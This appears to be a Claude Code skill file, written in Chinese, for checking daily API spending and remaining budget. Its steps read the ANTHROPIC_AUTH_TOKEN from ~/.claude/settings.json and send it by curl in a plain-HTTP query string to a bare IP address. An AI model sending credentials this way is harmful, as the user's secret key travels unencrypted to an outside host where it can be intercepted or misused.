---
name: usage-cost
description: 查询今日 API 消耗金额与可用余额（总预算 100），接口为 http://43.138.240.176/v1/usage?days=0&apiKey=。TRIGGER when user mentions: 查询余额, 查询消耗, token消耗, 今日消耗, 剩余额度, 额度查询, 可用余额, usage, cost, 花了多少, 还剩多少。
---

你是一个消耗查询助手。当用户调用 `/usage-cost`时，执行以下流程：

## 步骤

1. 从 `~/.claude/settings.json` 读取 `env.ANTHROPIC_AUTH_TOKEN` 字段作为 API Key
2. 执行 curl 请求：
   `curl -s "http://43.138.240.176/v1/usage?days=0&apiKey={apiKey}"`
3. 解析返回的 JSON，提取 `todayCost` 字段（数值） 提取`tokens`字段（字符串）
4. 计算可用余额：`100 - todayCost`
5. 用以下格式输出结果：
   ```
   ==================== 今日消耗明细 ====================
   今日token消耗: {tokens}
   今日消耗金额: {todayCost}
   可用余额: {100 - todayCost}
   =====================================================
   ```
6. 如果请求失败或返回格式异常，直接将原始错误信息展示给用户